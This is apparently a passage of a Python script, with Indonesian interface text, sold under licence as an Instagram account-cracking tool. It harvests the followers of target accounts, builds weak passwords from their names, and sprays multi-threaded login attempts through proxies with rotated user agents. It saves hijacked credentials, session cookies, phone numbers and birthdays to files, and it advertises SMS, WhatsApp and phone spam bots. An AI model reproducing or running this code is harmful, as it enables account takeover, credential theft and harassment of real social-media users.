			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://z-p42.www.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			id=x_jason['logged_in_user']['pk']
			nm=x_jason['logged_in_user']['full_name']
			pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''

ip = requests.get("https://api.ipify.org").text
ng = requests.get("http://ip-api.com/json/").json()["country"]
try:sh = requests.get('https://httpbin.org/ip').json()
except:sh = {'origin':'-'}
_gep = requests.get('http://ipinfo.io/json').json()

class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			prints(Panel(f"{H2}{ng}",title=f"{P2}negara",width=80,padding=(0,33),style=f"{color_table}"))
			axz.append(Panel(f"""{P2}username  : {H2}{self.username}\n{P2}followers : {H2}{followers}\n{P2}following :{H2} {following}\n{P2}Ip address:{H2} {ip}""",title=f"{P2}data akun",width=38,style=f"{color_table}"))
			axz.append(Panel(f"""{P2}Info kuota : {H2}{_gep['org']}\n{P2}Zona waktu : {H2}{_gep['timezone']}\n{P2}Kota       : {H2}{_gep['city']}\n{P2}Tanggal    : {H2}{day}""",title=f"{P2}info pengguna",width=39,style=f"{color_table}"))
			console.print(Columns(axz))
			prints(Panel(f" {H2}{waktu()}",title=f"{P2}waktu",width=80,padding=(0,30),style=f"{color_table}"))
			prints(Panel(f"{P2}[{color_rich}01{P2}]. crack dari pencarian nama        {P2}[{color_rich}06{P2}]. lihat akun hasil crack\n{P2}[{color_rich}02{P2}]. crack dari pengikut              {P2}[{color_rich}07{P2}]. bot auto unfollow\n{P2}[{color_rich}03{P2}]. crack dari mengikuti             {P2}[{color_rich}08{P2}]. Crack fb ( {H2}new crack{P2} )\n{P2}[{color_rich}04{P2}]. crack ulang hasil cp             {P2}[{color_rich}09{P2}]. Hapus lisensi  {H2}{P2} \n{P2}[{color_rich}05{P2}]. Bot spam target                  {P2}[{color_rich}00{P2}]. keluar ( {M2}hapus cookie{P2} )",width=80,padding=(0,4),style=f"{color_table}"))
			prints(Panel(f"{P2}jika ingin mengubah warna tema ketik {color_rich}'ubah' {P2}untuk mengubah warna tema",width=80,padding=(0,3),style=f"{color_table}"))

	def hapus_lisensi(self):
		ask = input(f" apakah anda yakin ingin menghapus lisensi? Y/t : ")
		if ask in ["y","Y"]:os.system("rm -rf data/lisensi.txt");prints(Panel(f"{P2}succeed menghapus {color_rich}'lisensi'{P2} terima kasih telah menggunakan script BrayennnXD",width=80,style=f"{color_table}"));time.sleep(2);exit()
		elif ask in ["t","T"]:self.menu()
		else:self.hapus_lisensi()

	def Exit(self):
		x=input(f" apakah anda yakin ingin keluar? Y/t : ")
		if x in ["y","Y"]:os.system("rm -rf data/.kukis.log rm -rf data/.username");prints(Panel(f"{P2}succeed menghapus {color_rich}'cookie' {P2}terima kasih telah menggunakan script BrayennnXD",width=80,padding=(0,2),style=f"{color_table}"));time.sleep(2);exit()
		elif x in ["t","T"]:self.menu()
		else:self.Exit()

	def sixAPI(self,six_id):
		url = "https://z-p42.www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=self.generateUUID(True)
		xx=self.s.get("https://z-p42.www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://z-p42.www.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://z-p42.www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
		return internal

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
			return idx
		else:lisensi()
   
   	
	def ingfo(self,cookie):
		try:
			link = s.get(f"https://z-p42.www.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":user_agentAPI()},cookies={"cookie":cookie}).json()["form_data"]
			nomor = link["phone_number"].replace("-", "").replace(" ", "")
			tggl = link["birthday"]
			year, month, day = tggl.split("-")
			month = bulan_ttl[month]
			tanggal = (f"{day} {month} {year}")
		except:
			nomor = "-"
			tanggal = "-"
		return nomor, tanggal

	
	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
			return internal
		else:lisensi()
		
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
			return internal
		else:lisensi()		
	
	def useragent(self):
		self.satu = random.randrange(73, 99)
		self.dua = random.randrange(4200, 4900)
		self.tiga = random.randrange(40, 150)
		useragent = f'''Mozilla/5.0 (Linux; Android 6.0.1; OnePlus 3T Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91{self.satu}.0.{self.dua}.{self.tiga} Mobile Safari/537.36 MQQBrowser/6.6''' 
		return useragent

	def passwordAPI(self,xnx):
		prints(Panel(f"{P2}total username terkumpul : {color_rich}{len(internal)}",width=80,padding=(0,20),style=f"{color_table}"))
		prints(Panel(f"{P2}[{color_rich}1{P2}]. name,name123,name1234\n{P2}[{color_rich}2{P2}]. name,name123,name1234,name12345\n{P2}[{color_rich}3{P2}]. name,name123,name1234,name12345,name123456\n{P2}[{color_rich}4{P2}]. password manual",width=80,padding=(0,14),style=f"{color_table}"))
		c=input(f' input 1 sampai 4 : ')
		if c=='1':
			self.generateAPI(xnx,c)
		elif c=='2':
			self.generateAPI(xnx,c)
		elif c=='3':
			self.generateAPI(xnx,c)
		elif c=='4':
			prints(Panel(f"{P2}masukan password manual minimal password 6 karakter jangan sampe kurang\ncontoh password : sayang,sayang123,indonesia,rahasia,xyaa123",width=80,style=f"{color_table}"))
			zx=input(f' masukan password : ')
			self.generateAPI(xnx,c,zx)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		global prog,des
		xxkontol.append(Panel(f"""   {H2}OK {P2}: {P2}result/{day}.txt""",width=38,style=f"{color_table}"))
		xxkontol.append(Panel(f"""   {K2}CP {P2}: {P2}result/{day}.txt""",width=39,style=f"{color_table}"))
		console.print(Columns(xxkontol))
		prints(Panel(f"{P2}crack di mulai tekan {color_rich}'Ctrl+Z'{P2} di keyboard anda jika ingin berhenti\n\n        {P2}hidupkan mode pesawat 5 detik jika terdeteksi spam ip",width=80,padding=(0,4),style=f"{color_table}"))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(internal))
		with prog:
			with ThreadPoolExecutor(max_workers=15) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=i.split("|")[1].lower()
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234']
									else:
										sandi=[w,w+'123',w+'1234']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12345']
									else:
										sandi=[w,w+'123',w+'1234',w+'12345', password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								elif o=="4":
									if len(zx) > 3:
										sandi = zx.replace(" ", "").split(",")
									else:
										break
								shinkai.submit(self.crackAPI,username,sandi)
					except:pass
		prints(Panel(f" {P2}crack {color_rich}{len(internal)} {P2}username selesai Hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"));time.sleep(4);exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":user_agentAPI(),"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass

		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua = random.choice(oppo)
		prog.update(des,description=f"{H2}stabil{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
				xyaa_code=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
				p = ses.get('https://z-p42.www.instagram.com/accounts/login/')
				ses.headers.update({
                    'Host':'z-p42.www.instagram.com',
                    'X-IG-App-ID':'1217981644879628',
                    'X-IG-WWW-Claim':'0',
                    'X-Instagram-AJAX':'e776ba0cb975',
                    'Content-Type':'application/x-www-form-urlencoded',
                    'Accept':'*/*',
                    'X-Requested-With':'XMLHttpRequest',
                    'X-ASBD-ID':'198387',
                    'User-Agent':ua,
                    'X-CSRFToken':p.cookies['csrftoken'],
                    'Origin':'https://z-p42.www.instagram.com',
                    'Sec-Fetch-Site':'same-origin',
                    'Sec-Fetch-Mode':'cors',
                    'Sec-Fetch-Dest':'empty',
                    'Referer':'https://z-p42.www.instagram.com/accounts/onetap/',
                    'Accept-Encoding':'gzip, deflate, br',
                    'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})        
				data = {
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			"username": user,
			"queryParams": "{}",
			"optIntoOneTap": 'false',
			"stopDeletionNonce": "",
			"trustedDeviceRecords": "{}"}
				respon=ses.post("https://z-p42.www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
				xyaa_code=json.loads(respon.text)
				if 'userId' in str(xyaa_code):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					nomor, tanggal = self.ingfo(cookie)
					tree = Tree("")
					tree.add(f"{P2}nama akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
					tree.add(f"{P2}followers : {H2}{pengikut}")
					tree.add(f"{P2}following : {H2}{mengikut}")
					tree.add(f"{P2}nomor hp  : {H2}{nomor}")
					tree.add(f"{P2}postingan : {H2}{postingan}")
					tree.add(f"{P2}tanggal lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}")
					prints(tree)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'checkpoint_url' in str(xyaa_code):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(f"{P2}nama akun : {K2}{nama}")
					tree.add(f"{P2}username  : {K2}{user}")
					tree.add(f"{P2}password  : {K2}{pw}")
					tree.add(f"{P2}followers : {K2}{pengikut}")
					tree.add(f"{P2}following : {K2}{mengikut}")
					tree.add(f"{P2}postingan : {K2}{postingan}\n")
					prints(tree)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif "Harap tunggu beberapa menit sebelum mencoba lagi." in str(respon.text):
					prog.update(des,description=f"{M2}spam ip{P2} {loop}/{len(internal)} OK-:{H2}{len(success)} {P2}CP-:{K2}{len(checkpoint)}{P2}")
					prog.advance(des)
					time.sleep(15)
					self.crackAPI(user,pas)
				elif "ip_block" in str(respon.text):
					prog.update(des,description=f"{M2}spam ip{P2} {loop}/{len(internal)} OK-:{H2}{len(success)} {P2}CP-:{K2}{len(checkpoint)}{P2}")
					prog.advance(des)
					time.sleep(30)
					self.crackAPI(user,pas)
				else:
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)

	def checkAPI(self,usr,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			ses=requests.Session()
			proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
			ua_xyaaxc = user_agentAPI()
			token=s.get("https://z-p42.www.instagram.com/accounts/login",headers={"user-agent":self.ua_igeh()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'authority': 'www.instagram.com',
				'connection': 'keep-alive',
				'sec-ch-ua': '";Not A Brand";v="99", "Chromium";v="94"',
				'x-ig-app-id': '1217981644879628',
                'x-ig-www-claim': 'hmac.AR3jlStdcYspw88nLWvVnCDdiZ-KPvru_TasoSJlzGz-iXV2',
                 'x-requested-with': 'XMLHttpRequest',
				'sec-ch-ua-mobile': '?1',
				'x-instagram-ajax': 'c6412f1b1b7b',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'x-csrftoken': crf_token,
				'user-agent': ua_xyaaxc,
				'x-asbd-id': '198387',
				'sec-ch-ua-platform': '"Android"',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})

			param={
				"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}",
					"username": usr,
					"optIntoOneTap": False,
					"queryParams": "{}",
					"stopDeletionNonce": "",
					"trustedDeviceRecords": "{}"
			}
			x=s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",data=param,proxies=proxy)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print(f"""
    ├ {CY} LIVE{N}
	├ {CY}{usr}|{pwd}
	├ Followers {CY}{pengikut}
	├ Following {CY}{mengikut}
	├ Posts
  	 ∟ jumlah Post {CY}{postingan}""")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print(f"""
    ├ {K}MANGKANYA GANTENG KONTOL{N}
	├ {K}{usr}|{pwd}
	├ Followers {K}{pengikut}
	├ Following {K}{mengikut}
	├ Posts
  	 ∟ jumlah Post {K}{postingan}""")
			elif 'Please wait a few minutes' in str(x.text):
				sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
				self.checkAPI(usr,pwd)
		except:
			self.checkAPI(usr,pwd)

	def menu(self):
		self.logo()
		c=input(f' input 1 sampai 9 : ')
		if c=='':
			prints(Panel(f"{P2}pilih yang bener broo jangan kosong !",width=80,padding=(0,19),style=f"{color_table}"));time.sleep(3);exit()
		elif c in ('1','01'):
			prints(Panel(f"{P2}maaf tools ini sedang dalam proses maintenance silahkan pilih menu lainnya",width=80,style=f"{color_table}"));sleep(2);exit()
			mas='[!] Masukan jumlah target'
			mas1=nel(mas,style='')
			sol().print(mas1)
			m=int(input(f'\n{N}[•] Jumlah : {C}'));print('')
			mas='[•] Masukan nama random untuk di searching'
			mas1=nel(mas,style='')
			sol().print(mas1)
			for i in range(m):
				i+1
				nama=input(f'{N} [•] Masukan nama ({H}{len(internal)}{C}): ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)

		elif c in ('2','02'):
			mas=input(f' apakah anda ingin crack masal Y/t : ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print("Y/t bro jangan kosong")


		elif c in ('3','03'):
			mas=input(f' apakah anda ingin crack masal Y/t : ')
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print("Y/t bro jangan kosong")


		elif c in ('4','04'):
			print('')
			for i in os.listdir('result'):
				prints(Panel(f"{P2}hasil crack {i}",width=80,style=f"{color_table}"))
			c=input(f' masukan nama file : ')
			g=open("result/%s"%(c)).read().splitlines()
			print(f' total results : {H}{len(g)}{C}')
			prints(Panel(f"{P2}proses mengecek status akun. silahkan tunggu sampai proses cek selesai",width=80,style=f"{color_table}"))
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			prints(Panel(f"{P2}proses cek akun selesai, silahkan jalankan ulang scriptnya python run.py",width=80,padding=(0,3),style=f"{color_table}"))

		elif c in ('5','05'):
			menu_bot()
			
		elif c in ('6','06'):
			global following
			prints(Panel(f"{P2}maaf tools ini sedang dalam proses maintenance silahkan pilih menu lainnya",width=80,style=f"{color_table}"));sleep(2);exit()
			six=0
			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
			x=open('data/.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
		elif c in ("ubah","Ubah","UBAH"):
			change_theme()
		elif c in ('7','07'):
			self.hapus_lisensi()
		elif c in ('0','00'):
			self.Exit()

		else:
			self.menu()
def tlisensi():
    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6285888222944?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
    open('.lisen.txt','w').write(lisen)
    lisensi()
    
def lisensi():
 try:
  cek=open('.lisen.txt').read()
  lisensikuni.append(cek)
 except:
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMzYwMTQxMSIsInA3Qld2ZWY3YTdIYjVseS9wWEJmQmxIKzB4a0gybVlEZm8rSkNUSXkiXQ==&ProductId=16362&Key='+lisensikuni[0]).json()
 status=res['licenseKey']['key']
 if status ==cek:
  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
  time.sleep(2)
  lisensiku.append("sukses")
  login_kamu()
 elif status ==KeyError:
  os.system('rm .lisen.txt')
 else:
  tlisensi()

def mengi(self):
			try:
				menudump.append('mengikuti')
				m=int(input(f' jumlah target : {N}'))
			except:m=1
			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
			for t in range(m):
				t +=1
				nama=input(f' username target : {C}')
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)

def meng(self):
	try:
		menudump.append('mengikuti')
		prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
		m=input(f' username target : ')
		print(f" wait collect username {m}")
		id=self.idAPI(self.cookie,m)
		info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		self.passwordAPI(info)
	except Exception as e:
		print(e)

def masal(self):
			try:
				menudump.append('pengikut')
				m=int(input(f' jumlah target : {N}'))
			except:m=1
			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
			for t in range(m):
				t +=1
				nama=input(f' username target : {C}')
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)



def massal(self):
			menudump.append('pengikut')
			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
			m=input(f' username target : {C}')
			print(f" wait collect username {m}")

			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)

def key():
	os.system("clear");banner();key = input(" masukan lisensi : ")
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=16754&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi kamu aktif, tolong gunakan tools ini dengan bijak",width=80,padding=(0,4),style=f"{color_table}"));time.sleep(4);login_kamu()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s"%(x)).json()['licenseKey']['key'];login_kamu()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

def key():
	os.system("clear") 
	banner()
	prints(Panel(f"{P2}silahkan ketik {H2}'beli'{P2} untuk melihat harga lisensi tools",width=80,padding=(0,9),style=f"{color_table}"))
	key = input(f" masukan lisensi :{H} ")
	if key in ["beli","Beli","BELI"]:beli_bang()
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi kamu aktif, tolong gunakan tools ini dengan bijak",width=80,padding=(0,4),style=f"{color_table}"));time.sleep(4);login_kamu()
	except KeyError:
		prints(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
				
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s"%(x)).json()['licenseKey']['key'];login_kamu()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
	
def buy_lisenn():
	try:xz = open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	os.system("clear");cek()
	
def beli_bang():
    prints(Panel(f"{P2}[{color_rich}01{P2}]. lisensi 1 minggu 50k\n{P2}[{color_rich}02{P2}]. lisensi 1 bulan 100k\n{P2}[{color_rich}03{P2}]. lisensi 2 bulan 150k\n{P2}[{color_rich}04{P2}]. permanen 250k\n{P2}[{color_rich}00{P2}]. keluar ( {M2}tools{P2} )",width=80,padding=(0,22),style=f"{color_table}"))
    zxc = input(" pilih lisensi : ")
    if zxc in [""]:prints(Panel(f"{P2}pilih yang bener broo jangan kosong !",width=80,padding=(0,19),style=f"{color_table}"));time.sleep(3);buy_lisenn()
    elif zxc in ["1","01"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+2+bulan");time.sleep(2);exit()
    elif zxc in ["4","04"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+permanen");time.sleep(2);exit()
    elif zxc in ["0","00"]:time.sleep(2);exit()
    else:prints(Panel(f"{P2}ngetik apan ngab !",width=80,padding=(0,28),style=f"{color_table}"));time.sleep(3);buy_lisenn()
        
def menu_bot():
	prints(Panel(f"{P2}[{color_rich}01{P2}] Bot spam SMS              [{color_rich}03{P2}] Bot spam telepon\n[{color_rich}02{P2}] Bot spam WA               [{color_rich}04{P2}] Bot share FB",width=80,padding=(0,8),style=f"{color_table}"))
	luk = input(f'input 1 sampai 4 : ')
	if luk in(''):
		prints(Panel(f"{P2}pilih yang bener broo jangan kosong !",width=80,padding=(0,19),style=f"{color_table}"));time.sleep(3);exit()
	if luk in('1','01'):
		spam_sms()
	elif luk in('2','02'):
		spam_wa()

